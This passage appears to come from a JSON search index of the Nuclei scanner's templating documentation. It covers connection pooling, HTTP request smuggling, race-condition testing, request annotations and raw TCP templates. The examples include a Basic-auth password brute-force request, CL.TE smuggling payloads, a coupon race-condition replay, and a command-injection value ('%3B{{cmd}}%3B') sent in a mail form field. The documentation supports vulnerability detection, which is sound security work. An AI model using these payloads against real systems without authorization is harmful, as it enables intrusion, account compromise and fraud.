pooling example author : pdteam severity : info http : - raw : - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:\u00a7password\u00a7')}} attack : batteringram payloads : password : password.txt threads : 40 matchers-condition : and matchers : - type : status status : - 200 - type : word words : - \"Unique string\" part : body","title":"Connection pooling"},{"location":"templating-guide/protocols/http/#smuggling","text":"HTTP Smuggling is a class of Web-Attacks recently made popular by Portswigger\u2019s Research into the topic. For an in-depth overview, please visit the article linked above. In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the rawhttp engine. The most basic example of an HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the unsafe: true attribute for rawhttp based requests. id : CL-TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : word words : - 'Unrecognized method GPOST' More examples are available in template-examples section for smuggling templates.","title":"Smuggling"},{"location":"templating-guide/protocols/http/#race-conditions","text":"Race Conditions are another class of bugs not easily automated via traditional tooling. Burp Suite introduced a Gate mechanism to Turbo Intruder where all the bytes for all the requests are sent expect the last one at once which is only sent together for all requests synchronizing the send event. We have implemented Gate mechanism in nuclei engine and allow them run via templates which makes the testing for this specific bug class simple and portable. To enable race condition check within template, race attribute can be set to true and race_count defines the number of simultaneous request you want to initiate. Below is an example template where the same request is repeated for 10 times using the gate logic. id : race-condition-testing info : name : Race condition testing author : pdteam severity : info http : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 You can simply replace the POST request with any suspected vulnerable request and change the race_count as per your need, and it's ready to run. nuclei -t race.yaml -target https://api.target.com Multi request race condition testing For the scenario when multiple requests needs to be sent in order to exploit the race condition, we can make use of threads. threads : 5 race : true threads is a total number of request you wanted make with the template to perform race condition testing. Below is an example template where multiple (5) unique request will be sent at the same time using the gate logic. id : multi-request-race info : name : Race condition testing with multiple requests author : pd-team severity : info http : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true","title":"Race conditions"},{"location":"templating-guide/protocols/http/#requests-annotation","text":"Request inline annotations allow performing per request properties/behavior override. They are very similar to python/java class annotations and must be put on the request just before the RFC line. Currently, only the following overrides are supported: @Host: which overrides the real target of the request (usually the host/ip provided as input). It supports syntax with ip/domain, port, and scheme, for example: domain.tld , domain.tld:port , http://domain.tld:port @tls-sni: which overrides the SNI Name of the TLS request (usually the hostname provided as input). It supports any literals. The special value request.host uses the Host header and interactsh-url uses an interactsh generated URL. @timeout: which overrides the timeout for the request to a custom duration. It supports durations formatted as string. If no duration is specified, the default Timeout flag value is used. The following example shows the annotations within a request: - | @Host: https://projectdiscovery.io:443 POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 This is particularly useful, for example, in the case of templates with multiple requests, where one request after the initial one needs to be performed to a specific host (for example, to check an API validity): http : - raw : # this request will be sent to {{Hostname}} to get the token - | GET /getkey HTTP/1.1 Host: {{Hostname}} # This request will be sent instead to https://api.target.com:443 to verify the token validity - | @Host: https://api.target.com:443 GET /api/key={{token}} HTTP/1.1 Host: api.target.com:443 extractors : - type : regex name : token part : body regex : # random extractor of strings between prefix and suffix - 'prefix(.*)suffix' matchers : - type : word part : body words : - valid token Example of a custom timeout annotations - - | @timeout: 25s POST /conf_mail.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M Example of sni annotation with interactsh-url - - | @tls-sni: interactsh-url POST /conf_mail.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M","title":"Requests Annotation"},{"location":"templating-guide/protocols/network/","text":"Network Requests \u00b6 Nuclei can act as an automatable Netcat , allowing users to send bytes across the wire and receive them, while providing matching and extracting capabilities on the response. Network Requests start with a network block which specifies the start of the requests for the template. # Start the requests for the template right here tcp : Inputs \u00b6 First thing in the request is inputs . Inputs are the data that will be sent to the server, and optionally any data to read from the server. At it's most simple, just specify a string, and it will be sent across the network socket. # inputs is the list of inputs to send to the server inputs : - data : \"TEST\\r\\n\" You can also send hex encoded text that will be first decoded and the raw bytes will be sent to the server. inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" Helper function expressions can also be defined in input and will be first evaluated and then sent to the server. The last Hex Encoded example can be sent with helper functions this way - inputs : - data : 'hex_decode(\"50494e47\")\\r\\n' One last thing that can be done with inputs is reading data from the socket. Specifying read-size with a non-zero value will do the trick. You can also assign the read data some name, so matching can be done on that part. inputs : - read-size : 8 Example with reading a number of bytes, and only matching on them. inputs : - read-size : 8 name : prefix ... matchers : - type : word part : prefix words : - \"CAFEBABE\" Multiple steps can be chained together in sequence to do network reading / writing. Host \u00b6 The next part of the requests is the host to connect to. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. Hostname - variable is replaced by the hostname provided on command line. An example name value: host : - \"{{Hostname}}\" Nuclei can also do TLS connection to the target server. Just add tls:// as prefix before the Hostname and you're good to go. host : - \"tls://{{Hostname}}\" If a port is specified in the host, the user supplied port is ignored and the template port takes precedence. Matchers / Extractor Parts \u00b6 Valid part values supported by Network protocol for Matchers / Extractor are - Value Description request Network Request data Final Data Read From Network Socket raw / body / all All Data received from Socket Example Network Template \u00b6 The final example template file for a hex encoded input to detect MongoDB running on servers with working matchers is provided below. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle tcp : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\" More complete examples are provided here","title":"Network"},{"location":"templating-guide/protocols/network/#network-requests","text":"Nuclei can act as an automatable Netcat , allowing users to send bytes across the wire and receive them, while providing matching and extracting capabilities on the response. Network Requests start with a network block which specifies the start of the requests for the template. # Start the requests for the template right here tcp :","title":"Network Requests"},{"location":"templating-guide/protocols/network/#inputs","text":"First thing in the request is inputs . Inputs are the data that will be sent to the server, and optionally any data to read from the server. At it's most simple, just specify a string, and it will be sent across the network socket. # inputs is the list of inputs to send to the server inputs : - data : \"TEST\\r\\n\" You can also send hex encoded text that will be first decoded and the raw bytes will be sent to the server. inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" Helper function expressions can also be defined in input and will be first evaluated and then sent to the server. The last Hex Encoded example can be sent with helper functions this way - inputs : - data : 'hex_decode(\"50494e47\")\\r\\n' One last thing that can be done with inputs is reading data from the socket. Specifying read-size with a non-zero value will do the trick. You can also assign the read data some name, so matching can be done on that part. inputs : - read-size : 8 Example with reading a number of bytes, and only matching on them. inputs : - read-size : 8 name : prefix ... matchers : - type : word part : prefix words : - \"CAFEBABE\" Multiple steps can be chained together in sequence to do network reading / writing.","title":"Inputs"},{"location":"templating-guide/protocols/network/#host","text":"The next part of the requests is the host to connect to. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. Hostname - variable is replaced by the hostname provided on command line. An example name value: host : - \"{{Hostname}}\" Nuclei can also do TLS connection to the target server. Just add tls:// as prefix before the Hostname and you're good to go. host : - \"tls://{{Hostname}}\" If a port is specified in the host, the user supplied port is ignored and the template port takes precedence.","title":"Host"},{"location":"templating-guide/protocols/network/#matchers-extractor-parts","text":"Valid part values supported by Network protocol for Matchers / Extractor are - Value Description request Network Request data Final Data Read From Network Socket raw / body / all All Data received from Socket","title":"Matchers / Extractor Parts"},{"location":"templating-guide/protocols/network/#example-network-template","text":"The final example template file for a hex encoded input to detect MongoDB running on servers with working matchers is provided below. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle tcp : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\" More complete examples are provided here","title":"Example Network Template"}]}